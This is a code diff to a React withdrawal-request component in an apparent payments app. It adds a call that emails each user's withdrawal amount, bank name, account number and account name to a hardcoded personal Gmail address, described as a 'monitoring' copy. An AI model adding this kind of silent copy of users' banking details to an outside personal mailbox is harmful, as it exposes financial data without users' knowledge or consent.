@@ -1,3 +1,4 @@
+
 import React, { useState } from 'react';
 import { Banknote, AlertCircle } from 'lucide-react';
 import Button from '@/components/ui/custom/Button';
@@ -80,6 +81,18 @@ const WithdrawalRequest = ({ availableBalance, onWithdrawalRequest }: Withdrawal
         await sendWithdrawalRequestEmail(
           user.email,
           user.name,
+          {
+            amount: withdrawalAmount,
+            bankName: bankDetails.bankName,
+            accountNumber: bankDetails.accountNumber,
+            accountName: bankDetails.accountName
+          }
+        );
+
+        // Also send a copy to monitoring email
+        await sendWithdrawalRequestEmail(
+          'cjoguibe@gmail.com',
+          'Admin (Copy)',
           {
             amount: withdrawalAmount,
             bankName: bankDetails.bankName,
